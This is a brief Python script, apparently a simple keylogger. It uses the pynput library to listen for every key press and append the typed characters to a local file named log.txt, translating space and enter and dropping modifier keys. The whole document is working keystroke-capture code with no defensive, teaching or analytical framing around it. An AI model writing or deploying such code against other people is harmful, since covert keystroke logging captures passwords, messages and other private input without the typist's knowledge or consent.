from pynput.keyboard import Listener

def writetofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    
    if letter =='Key.space':
        letter=' '
    if letter == 'Key.shift_r':
        letter =''
    if letter =="Key.ctrl_l":
        letter =""
    if letter =="Key.enter":
        letter="\n"
    if letter == 'Key.backspace':
        letter = ''
        
    
    with open("log.txt",'a') as f: #create and write into file
        f.write(letter)
        
# saving or storing the instance of listener(its a object) in L
with Listener(on_press=writetofile) as l:
    l.join() #ensures the keystrokes are joined together
 
    